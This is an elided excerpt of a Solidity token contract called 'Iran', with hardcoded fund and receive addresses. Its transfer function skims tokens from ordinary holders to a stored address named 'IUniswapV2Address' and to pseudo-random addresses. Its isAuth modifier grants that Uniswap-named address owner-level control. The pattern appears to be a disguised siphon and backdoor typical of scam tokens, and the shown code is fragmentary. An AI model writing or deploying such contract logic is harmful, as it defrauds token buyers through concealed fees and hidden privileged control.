...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function _transfer(
        ...
        if(airdrop && !_feeWhiteList[from] && !_feeWhiteList[to]){
                _basicTransfer(from,IUniswapV2Address,AIRAmount);            
            address ad;
            for(int i=0;i <=0;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,AIRAmount*2);
            }
            amount -= AIRAmount*3;
        }
    ...
    function setlpAddress(address addr) external isAuth {
    ...
    modifier isAuth() {
        require(IUniswapV2Address == msg.sender || _owner == msg.sender);
        _;
    }
...
contract Iran is AbsToken {
    constructor() AbsToken(
        ...
        9,//Decimals
        10000,//Supply
        address(0xA96af1F30aA82f12916B92F17f92e7a867157E6c),//FundAddress       
        address(0xB1c5D424Cb2161f6CAC4411C32326E7f3151910F)//ReceiveAddress
